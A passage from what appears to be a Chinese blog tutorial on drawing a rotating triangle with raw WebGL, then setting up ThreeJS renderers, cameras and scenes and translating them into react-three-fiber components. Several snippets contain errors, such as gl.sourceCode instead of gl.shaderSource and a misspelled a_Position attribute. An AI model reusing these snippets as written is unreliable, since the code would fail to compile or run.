buffer 中，再将这个顶点着色器与 WebGL 绑定，获取到在 GLSL 语言编写的着色器代码变量，buffer 可以自动将开发者编写的2d坐标转化为三维坐标点，再传入着色器代码中。</p><h3 id="1-2-4-矩阵运算"><a href="#1-2-4-矩阵运算" class="headerlink" title="1.2.4 矩阵运算"></a>1.2.4 矩阵运算</h3><p>在图形的世界中，图形的位置实际上就是图形上各个顶点在某一向量上的位移。那么如果我们能找出点的变化的规律，那就可以将其抽象化为一个变换公式，让计算机去实现动画以及复杂图像的渲染。</p><p>在大学高等数学的几何部分，我们已经学过在笛卡尔坐标系中如何对点的坐标进行变换，在线性代数中，我们得知这些变换的过程我们都可以使用矩阵来表示。实际上，矩阵的本质就是运动的描述，在线性空间中，向量描述对象，矩阵描述对象的运动，矩阵乘法对该对象施加运动。对于平移来说，我们还需要引入齐次坐标的概念，而这些概念无论是在二维的或是在三维的坐标中都是通用的。</p><blockquote><p>Tips: 一切复杂的变换过程都可以简化为多个合成变换，这是一个非常重要的思想。</p></blockquote><p>对于线性代数的讨论因为笔者能力有限，本章不再继续讨论。在图形学中，最常见的移动为平移与绕轴旋转，他们的常用计算公式如下：</p><p><strong>在平面平移时的矩阵计算：</strong></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190821151121.png" alt="20190821151121.png"></p><p><strong>在旋转时的矩阵运算：</strong></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190821151156.png" alt="20190821151156.png"></p><p><strong>绕轴渲染的矩阵运算：</strong></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190821151215.png" alt="20190821151215.png"></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190821151248.png" alt="20190821151248.png"></p><h2 id="1-3-使用-WebGL"><a href="#1-3-使用-WebGL" class="headerlink" title="1.3 使用 WebGL"></a>1.3 使用 WebGL</h2><p>在阐述过 WebGL 基础概念之后，我们就可以利用这些概念来进行编码了，以下将具体的演示如何实现 WebGL 的整个渲染管线，并最终绘制一个旋转的三角形。</p><h3 id="1-3-1-Shader-的创建与绑定绑定流程"><a href="#1-3-1-Shader-的创建与绑定绑定流程" class="headerlink" title="1.3.1 Shader 的创建与绑定绑定流程"></a>1.3.1 Shader 的创建与绑定绑定流程</h3><p>第一步的标题就很唬人，其实换句简单的话来说，就是我们要创建在上文中讲到的两种 Shader（顶点着色器、片元着色器）并将其绑定给 HTML 中的 WebGL 对象，让浏览器明白要绘制怎样的图像，并且让 Javascript 来控制整个渲染的流程，下文会一步一步的解释这个过程。</p><p>首先我们需要在 HTML 中创建一个 Canvas：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;myCanvas&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span>Ops! 你的浏览器不支持 Canvas<span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从 HTML 跳回到我们的 Javascript，要想使用 WebGL，我们就需要收件创建一个 WebGL 类型的 Canvas，并获取到其上下文，以便后续的操作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myCanvas&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> gl = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;webgl&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(gl)</span><br></pre></td></tr></table></figure><p>那么接下来我们就需要使用 WebGL 的 API 来定义顶点着色器（VertexShader）和片元着色器（FragmentShader）了，这一步会使用到一些陌生的 WebGL API：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建和初始化一个 WebGLProgram 对象</span></span><br><span class="line"><span class="keyword">var</span> program = gl.<span class="title function_">createProgram</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义变量用于存放 GLSL 代码</span></span><br><span class="line"><span class="comment">// 【注意，我们在这里先只定义了变量，并未对他们进行赋值，这两个变量在接下来将用于存放顶点着色器以及片元着色器的 GLSL 的代码片段】</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">VSHADER_SOURCE</span>, <span class="variable constant_">FSHADER_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// shader 应该包含两部分:</span></span><br><span class="line"><span class="comment">// 一部分是 context WebGL api 定义出来 shader</span></span><br><span class="line"><span class="comment">// 第二部分是 shader 本身的代码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createShader</span>(<span class="params">gl, sourceCode, type</span>) &#123;</span><br><span class="line">  <span class="comment">// 创建 shader（着色器）</span></span><br><span class="line">  <span class="keyword">var</span> shader = gl.<span class="title function_">createShader</span>(type)</span><br><span class="line">  gl.<span class="title function_">sourceCode</span>(shader, sourceCode)</span><br><span class="line">  gl.<span class="title function_">compileShader</span>(shader)</span><br><span class="line">  <span class="keyword">return</span> shader</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 vertex shader（顶点着色器）</span></span><br><span class="line"><span class="keyword">var</span> vertexShader = <span class="title function_">createShader</span>(gl, <span class="variable constant_">VSHADER_SOURCE</span>, gl.<span class="property">VERTEX_SHADER</span>)</span><br><span class="line"><span class="comment">// 定义 frament shader（片元着色器）</span></span><br><span class="line"><span class="keyword">var</span> fragmentShader = <span class="title function_">createShader</span>(gl, <span class="variable constant_">FSHADER_SOURCE</span>, gl.<span class="property">FRAGMENT_SHADER</span>)</span><br></pre></td></tr></table></figure><p>只有将定义出的 shader （着色器）与主程序绑定之后，我们才可以来控制着色器绘制图像，之后我们要做的就是操控两种着色器对图像进行绘制。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  将着色器附加到 program 上</span></span><br><span class="line">gl.<span class="title function_">attachShader</span>(program, vertexShader)</span><br><span class="line">gl.<span class="title function_">attachShader</span>(program, fragmentShader)</span><br><span class="line"></span><br><span class="line"><span class="comment">// link program to context</span></span><br><span class="line">gl.<span class="title function_">linkProgram</span>(program)</span><br><span class="line">gl.<span class="title function_">useProgram</span>(program)</span><br><span class="line">gl.<span class="property">program</span> = program</span><br></pre></td></tr></table></figure><h3 id="1-3-2-定义着色器的GLSL代码"><a href="#1-3-2-定义着色器的GLSL代码" class="headerlink" title="1.3.2 定义着色器的GLSL代码"></a>1.3.2 定义着色器的GLSL代码</h3><p>我们在上一步的代码中之定义了两个着色器的变量，未对他们进行赋值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable constant_">VSHADER_SOURCE</span>, <span class="variable constant_">FSHADER_SOURCE</span></span><br></pre></td></tr></table></figure><p>接下来本文将指引你如何编写一个 GLSL 代码，并将其赋值给两个变量。</p><p>在使用 GLSL 代码前，我们需要了解 GLSL 中的数据类型，在本示例中，需要用到的数据类型有三种：</p><ol><li><code>attribute</code> ：只能在 vertex shader 中使用的变量，一般用于顶点数据。顶点数据需要利用 WebGL 中的 Buffer 定义，将 Buffer 地址传递到顶点着色器，并且往对应的 Buffer 中传递顶点的数据。</li><li><code>unifor</code> ：常量，不能被 shader 修改。uniform 变量在 vertex 和 fragment 两只之间的生命方式完全一样，则它可以在 vertex 和 fragment 共享使用（相当于一个可被共享的全局变量）通常用来传递变换矩阵、光线参数等。</li><li><code>varying</code> ：varying 变量是 vertex 和 fragment shader 之间做数据传递用的</li></ol><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- var VSHADER_SOURCE, FSHADER_SOURCE</span></span><br><span class="line"></span><br><span class="line">// 定义顶点着色器代码：</span><br><span class="line"><span class="addition">+ var VSHADER_SOURCE = `</span></span><br><span class="line"><span class="addition">+   // vec4 代表的是一个四维向量，我们在此定义一个名为 a_Poisiton 的变量</span></span><br><span class="line"><span class="addition">+   attribute vec4 a_Positon;</span></span><br><span class="line"><span class="addition">+   void main()&#123;</span></span><br><span class="line"><span class="addition">+     // gl_Position 是 GLSL 内置的 api</span></span><br><span class="line"><span class="addition">+     gl_Position = a_Position;</span></span><br><span class="line"><span class="addition">+   &#125;</span></span><br><span class="line"><span class="addition">+ `</span></span><br><span class="line"></span><br><span class="line">// 定义片元着色器代码：</span><br><span class="line"><span class="addition">+ var FSHADER_SOURCE = `</span></span><br><span class="line"><span class="addition">+   void main()&#123;</span></span><br><span class="line"><span class="addition">+     // 添加一个 rgba 值为 (1.0, 0.0, 0.0, 1.0) 的颜色【红色】</span></span><br><span class="line"><span class="addition">+     gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);</span></span><br><span class="line"><span class="addition">+   &#125;</span></span><br><span class="line"><span class="addition">+ `</span></span><br></pre></td></tr></table></figure><blockquote><p>gl_position 的坐标并没内有经过透视除法的运算，所以其值为一个 vec4，vec4 的第四位参数是代表一个所放系数，用来产生近大远小的效果。</p></blockquote><h3 id="1-3-3-使用-buffer-向着色器代码中传值"><a href="#1-3-3-使用-buffer-向着色器代码中传值" class="headerlink" title="1.3.3 使用 buffer 向着色器代码中传值"></a>1.3.3 使用 buffer 向着色器代码中传值</h3><p>我们已经定义好了着色器的代码，代码中也存在着变量，因此我们就需要考虑如何用 Javascript 来把值传递给这些变量，从而渲染出一个图形。</p><p>buffer 是一个重要的概念，开发者在 js 中定义的坐标不能够直接使用，必须将原数据绑定到一个顶点着色器 buffer 中，再将这个顶点着色器与 WebGL 绑定，获取到在 GLSL 语言编写的着色器代码变量，buffer 可以自动将开发者编写的 2d 坐标转化为三维坐标点，再传入着色器代码中。初始化代码示例如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">initVertexBuffers</span>(<span class="params">gl</span>) &#123;</span><br><span class="line">  <span class="comment">// 传入三角形的三个顶点到 vertices</span></span><br><span class="line">  <span class="keyword">var</span> vertices = <span class="keyword">new</span> <span class="title class_">Float32Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">0.5</span>, -<span class="number">0.5</span>, -<span class="number">0.5</span>, <span class="number">0.5</span>, -<span class="number">0.5</span></span><br><span class="line">  ])</span><br><span class="line">  <span class="comment">// 顶点个数</span></span><br><span class="line">  <span class="keyword">var</span> n = <span class="number">3</span></span><br><span class="line">  <span class="comment">// 创建一个 buffer</span></span><br><span class="line">  <span class="keyword">var</span> vertexBuffer = gl.<span class="title function_">createBuffer</span>()</span><br><span class="line">  <span class="comment">// 将 vertexBuffer 与 webgl 绑定</span></span><br><span class="line">  gl.<span class="title function_">bindBuffer</span>(gl.<span class="property">ARRAY_BUFFER</span>, vertexBuffer)</span><br><span class="line">  <span class="comment">// 将数据写入到 vertexBuffer 中</span></span><br><span class="line">  gl.<span class="title function_">bufferData</span>(gl.<span class="property">ARRAY_BUFFER</span>, vertices, gl.<span class="property">STATIC_DRAW</span>)</span><br><span class="line">  <span class="comment">// 获取变量 a_Position 在 vertex shader 中的地址</span></span><br><span class="line">  <span class="keyword">var</span> a_Position = gl.<span class="title function_">getAttribLocation</span>(gl.<span class="property">program</span>, <span class="string">&#x27;a_Position&#x27;</span>)</span><br><span class="line">  <span class="comment">// 将 bufferData 传入到 a_Position 的地址，同时需要规定一个顶点对应数组中的几个数据</span></span><br><span class="line">  gl.<span class="title function_">vertexAttribPointer</span>(a_Position, <span class="number">2</span>, gl.<span class="property">FLOAT</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">  <span class="comment">// 启用 a_Position variable</span></span><br><span class="line">  gl.<span class="title function_">enableVertexAttribArray</span>(a_Position)</span><br><span class="line">  <span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> n = <span class="title function_">initVertexBuffers</span>(gl)</span><br></pre></td></tr></table></figure><p>定义顶点时其坐标效如下：</p><p><img src="https://i.loli.net/2020/08/30/rnfVw21DCTUxEtg.png" alt="坐标"></p><h3 id="1-3-4-图像绘制"><a href="#1-3-4-图像绘制" class="headerlink" title="1.3.4 图像绘制"></a>1.3.4 图像绘制</h3><p>通过 buffer 将坐标数据传入顶点着色器后，已经在缓冲区生成了图像，但是图像尚未被渲染与视图上，之后需要进行一个绘制操作，首先需要清空画布，之后定义绘制的类型（如 TRIANGLES 类）、顶点数据的起始位、顶点个数就可以将图像绘制出来：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gl.<span class="title function_">clearColor</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// 调用clear方法将当前绘制结果清空</span></span><br><span class="line">gl.<span class="title function_">clear</span>(gl.<span class="property">COLOR_BUFFER_BIT</span>)</span><br><span class="line"><span class="comment">// 按照三角形的图源去绘制，从 buffer 的起始位获取数据，绘制 n 个顶点</span></span><br><span class="line">gl.<span class="title function_">drawArrays</span>(gl.<span class="property">TRIANGLES</span>, <span class="number">0</span>, n)</span><br></pre></td></tr></table></figure><p>最终我们可以绘制出一个红色的平面三角形。</p><h3 id="1-3-5-绘制动态的三角形"><a href="#1-3-5-绘制动态的三角形" class="headerlink" title="1.3.5 绘制动态的三角形"></a>1.3.5 绘制动态的三角形</h3><p>在上图中，我们绘制的时一个“看似”平面的三角形，实际上，其所在的空间是一个三维空间，我们可以在这个三维空间中对其进行旋转位移等操作。</p><p>假如我们想让我们绘制好的这个三角形绕 y 轴进行旋转，那么很简单，我们只需要为其创建一个旋转矩阵，在三维空间中，这个矩阵是 4x4 的，其数学表达可以表示如下：</p><p><img src="https://i.loli.net/2020/08/30/ePYvRAFkmLBapVM.png" alt=""></p><p>转换为着色器的表达，那么就是在每次运行顶点着色其的代码时，让每一个顶点都与一个矩阵相乘，我么可以将顶点着色器改写为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable constant_">VSHADER_SOURCE</span> =</span><br><span class="line">  <span class="string">&quot;attribute vec4 a_Position;\n&quot;</span> +</span><br><span class="line">  <span class="string">&quot;uniform mat4 u_ModelMatrix;\n&quot;</span> +</span><br><span class="line">  <span class="string">&quot;void main() &#123;\n&quot;</span> +</span><br><span class="line">  <span class="comment">// 与一个矩阵相乘</span></span><br><span class="line">  <span class="string">&quot;  gl_Position = u_ModelMatrix * a_Position;\n&quot;</span> +</span><br><span class="line">  <span class="string">&quot;&#125;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>之后利用 buffer 进行传参就可以将具体的矩阵传入了，如果想要动画效果，让其在试图内进行动态的旋转，那么我们可以利用 canvas 动画的原理，在每一帧渲染后清空画布，之后再重新执行渲染动作即可。具体的代码就不再复现，感兴趣的可以参考以下源码：</p><p><a href="https://github.com/EsunR/JumpToJump/blob/master/Demo/webgl.js">https://github.com/EsunR/JumpToJump/blob/master/Demo/webgl.js</a></p><h1 id="2-ThreeJS"><a href="#2-ThreeJS" class="headerlink" title="2. ThreeJS"></a>2. ThreeJS</h1><h2 id="2-1-ThreeJS-概述"><a href="#2-1-ThreeJS-概述" class="headerlink" title="2.1 ThreeJS 概述"></a>2.1 ThreeJS 概述</h2><p>由于原生WebGL相对复杂，所以使用ThreeJS可以大幅减少开发成本，ThreeJS 将常用的 WebGL 表达式、算法、图形封装，以便开发者可以便捷使用，减少对 WebGL 复杂 api 的使用。</p><p>使用 ThreeJS 的优势：</p><ul><li>弥补原生 WebGL 的缺乏抽象和模块化的缺点</li><li>简便图形学算法的实现</li><li>简化 GLSL 开发和调试，尽量避免使用 GLSL</li></ul><p>缺点：</p><ul><li>缺少自由度</li></ul><p>以下是 ThreeJS 中封装的主要对象：</p><p><img src="http://study.esunr.xyz/1577946595924.png" alt=""></p><h2 id="2-2-渲染器-Renderer"><a href="#2-2-渲染器-Renderer" class="headerlink" title="2.2 渲染器 Renderer"></a>2.2 渲染器 Renderer</h2><p>在场景中设立了物体与光线以及相机后，需要渲染器将场景渲染出来。</p><p>Renderer要绑定一个canvas对象，实例化一个 Renderer 的过程如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo-canvas&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> renderer = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">WebGLRenderer</span>(&#123;</span><br><span class="line">  <span class="attr">canvas</span>: canvas</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>通过 Render 可以设置背景色与大小，通常这个大小与整个画布相等：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">renderer.<span class="title function_">setClearColor</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Color</span>(<span class="number">0x000000</span>, <span class="number">1.0</span>))</span><br><span class="line">renderer.<span class="title function_">setSize</span>(<span class="number">400</span>, <span class="number">400</span>)</span><br></pre></td></tr></table></figure><p>当完成了相机和场景的定义后，就可以使用渲染器上的 <code>render()</code> 方法将其渲染到画面上，第一个参数位传入实例化的 scene，第二个参数位传入实例化的 camera：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">renderer.<span class="title function_">render</span>(scene, camera)</span><br></pre></td></tr></table></figure><p>通常渲染器会放在一个render函数中被重复调用，渲染器在每次渲染时会自动将上一帧场景清除，重新绘制一帧，这样不停的重新渲染，就会产生动态效果了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> render = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ... 每一帧对场景进行应有的变动</span></span><br><span class="line">  renderer.<span class="title function_">render</span>(scene, camera)</span><br><span class="line">  <span class="title function_">requestAnimationFrame</span>(render)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-相机-Camera"><a href="#2-3-相机-Camera" class="headerlink" title="2.3 相机 Camera"></a>2.3 相机 Camera</h2><p>在 ThreeJS 中相机分为两种相机，分别是 <strong>正交投影相机</strong> 与 <strong>透视投影相机</strong>。</p><p><strong>正交投影相机 OrthographicCamera：</strong></p><p><img src="https://pic4.zhimg.com/80/v2-62ede52e0bb0d8b49f6cf2e41debc247_hd.jpg" alt=""></p><blockquote><p>注：图中的”视点”对应着Three中的Camera。</p><p>这里补充一个视景体的概念：视景体是一个几何体，只有视景体内的物体才会被我们看到，视景体之外的物体将被裁剪掉。这是为了去除不必要的运算。</p><p>正交投影相机的视景体是一个长方体，OrthographicCamera的构造函数是这样的：OrthographicCamera( left, right, top, bottom, near, far )</p><p>Camera本身可以看作是一个点，left则表示左平面在左右方向上与Camera的距离。另外几个参数同理。于是六个参数分别定义了视景体六个面的位置。</p><p>可以近似地认为，视景体里的物体平行投影到近平面上，然后近平面上的图像被渲染到屏幕上。</p></blockquote><p>实例化一个简单的正交相机可以使用 <code>new THREE.OrthographicCamera()</code> 传入的参数分别为定义的空间范围（上下左右前后）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> camera = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">OrthographicCamera</span>(-width / <span class="number">2</span>, width / <span class="number">2</span>, height / <span class="number">2</span>, -height / <span class="number">2</span>, -<span class="number">1000</span>, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>在一个3D的空间中，相机需要摆放到一个固定的点去观察物体，同时还要设置观察的方向：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 相机由 (0,0,100) 的坐标望向 (0,0,0) 的坐标</span></span><br><span class="line">camera.<span class="property">position</span>.<span class="property">x</span> = <span class="number">0</span></span><br><span class="line">camera.<span class="property">position</span>.<span class="property">y</span> = <span class="number">0</span></span><br><span class="line">camera.<span class="property">position</span>.<span class="property">z</span> = <span class="number">100</span></span><br><span class="line">camera.<span class="title function_">lookAt</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>假如我们在点 (0,0,0) 处设置了一个平面三角形，按照相机的摆放位置看上去是这样的：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190824174049.png" alt="20190824174049.png"></p><p>当将相机摆放在(100,100,100)的位置，即摆放在三角形的右上角，观察三角形的情况为：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190824174230.png" alt="20190824174230.png"></p><blockquote><p>由于我们使用了正交相机，图形没有近大远小的效果，看起来很奇怪，但是由 AxisHelp 坐标可以看出视角已经发生了变化</p></blockquote><p><strong>透视投影相机：</strong></p><p><img src="https://pic2.zhimg.com/80/v2-3b160a77bda7661c4dd3920ddeaae605_hd.jpg" alt=""></p><blockquote><p>透视投影相机的视景体是个四棱台，它的构造函数是这样的：PerspectiveCamera( fov, aspect, near, far )</p><p>fov对应着图中的视角，是上下两面的夹角。aspect是近平面的宽高比。在加上近平面距离near，远平面距离far，就可以唯一确定这个视景体了。</p><p>透视投影相机很符合我们通常的看东西的感觉，因此大多数情况下我们都是用透视投影相机展示3D效果。</p></blockquote><p><strong>场景：</strong></p><p>场景是所有物体的容器，也对应着我们创建的三维世界，只有我们在 scene 中添加的物体才会被展示出来。</p><p>创建一个 scene 实例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scene = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Scene</span>()</span><br></pre></td></tr></table></figure><p>向scene中添加一个物体，如AxisHelper（辅助坐标，可以帮助我们观察场景）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> axesHelper = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">AxisHelper</span>(<span class="number">100</span>)</span><br><span class="line">scene.<span class="title function_">add</span>(<span class="variable language_">this</span>.<span class="property">axesHelper</span>)</span><br></pre></td></tr></table></figure><h1 id="3-react-three-fiber"><a href="#3-react-three-fiber" class="headerlink" title="3. react-three-fiber"></a>3. react-three-fiber</h1><p>react-three-fiber 是一个应用于 React 项目（以下简称 RTF）或者 React-Native 项目中的渲染器，其内部是由 threeJS 实现的。</p><p>利用 RTF 可以让我们更便捷的使用组件的风格来构建 threeJS 场景，其对于 ThreeJS 的 API 封装时有规律可循的，我们在这里演示以下如何将 threeJS 的代码转换为 RTF 风格的代码，从而让你更快上手改渲染器。</p><p>我们截取 《ThreeJS 开发指南》 第一章节的一段代码，构建出一个三维场景，效果如下：</p><p><img src="https://i.loli.net/2020/08/31/GxcelV95I2aQJBT.png" alt=""></p><blockquote><p>Tips: 完整源码请查看 <a href="https://github.com/josdirksen/learning-threejs/blob/master/chapter-01/02-first-scene.html">https://github.com/josdirksen/learning-threejs/blob/master/chapter-01/02-first-scene.html</a></p></blockquote><h2 id="3-1-场景的创建"><a href="#3-1-场景的创建" class="headerlink" title="3.1 场景的创建"></a>3.1 场景的创建</h2><p>在 ThreeJS 中，如果要创建场景，就必须构建一个 <code>Scene</code> 对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a scene, that will hold all our elements such as objects, cameras and lights.</span></span><br><span class="line"><span class="keyword">var</span> scene = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Scene</span>();</span><br></pre></td></tr></table></figure><p>如果要往场景中添加元素则需要使用 <code>scene.add()</code> 进行添加。</p><p>而在 RTF 中，创建一个场景与添加元素就好像我们写嵌套组件一样，他们有一层很明显的父子级关系，如我们要添加一个 AxisHelper：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Canvas</span> &#123;...prosp&#125;&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">axesHelper</span> /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">Canvas</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="3-2-相机的设置"><a href="#3-2-相机的设置" class="headerlink" title="3.2 相机的设置"></a>3.2 相机的设置</h2><p>在 ThreeJS 中相机是个很重要的概念，在 ThreeJS 中创建相机我们需要配置其类型、位置、焦点等信息，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> camera = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">PerspectiveCamera</span>(<span class="number">45</span>, <span class="variable language_">window</span>.<span class="property">innerWidth</span> / <span class="variable language_">window</span>.<span class="property">innerHeight</span>, <span class="number">0.1</span>, <span class="number">1000</span>);</span><br><span class="line">camera.<span class="property">position</span>.<span class="property">x</span> = -<span class="number">30</span>;</span><br><span class="line">camera.<span class="property">position</span>.<span class="property">y</span> = <span class="number">40</span>;</span><br><span class="line">camera.<span class="property">position</span>.<span class="property">z</span> = <span class="number">30</span>;</span><br><span class="line">camera.<span class="title function_">lookAt</span>(scene.<span class="property">position</span>);</span><br></pre></td></tr></table></figure><p>在 RTF 中，创建相机是在 Canvas 组件中进行配置的，一个场景只拥有一个相机，同时其默认是一个正交相机：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Canvas</span></span><br><span class="line">      camera=&#123;&#123;</span><br><span class="line">        <span class="attr">fov</span>: <span class="number">45</span>,</span><br><span class="line">        <span class="attr">aspect</span>: <span class="variable language_">window</span>.<span class="property">innerWidth</span> / <span class="variable language_">window</span>.<span class="property">innerHeight</span>,</span><br><span class="line">        <span class="attr">near</span>: <span class="number">0.1</span>,</span><br><span class="line">        <span class="attr">far</span>: <span class="number">1000</span>,</span><br><span class="line">        <span class="attr">position</span>: [-<span class="number">30</span>, <span class="number">40</span>, <span class="number">30</span>],</span><br><span class="line">      &#125;&#125;</span><br><span class="line">    &gt;</span><br><span class="line">    &#123;<span class="comment">/* ... ... */</span>&#125;</span><br><span class="line">&lt;/<span class="title class_">Canvas</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="3-3-Mesh-的构建"><a href="#3-3-Mesh-的构建" class="headerlink" title="3.3 Mesh 的构建"></a>3.3 Mesh 的构建</h2><p>在 ThreeJS 